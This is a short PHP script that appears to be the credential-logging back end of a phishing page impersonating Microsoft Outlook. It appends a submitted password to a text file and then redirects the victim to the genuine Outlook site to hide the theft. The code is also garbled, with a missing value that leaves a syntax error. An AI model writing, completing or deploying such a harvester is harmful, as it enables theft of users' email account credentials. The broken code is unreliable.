<?php 
file_put_contents("usernames.txt", . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
header ('Location: https://outlook.live.com/owa/#');
?>
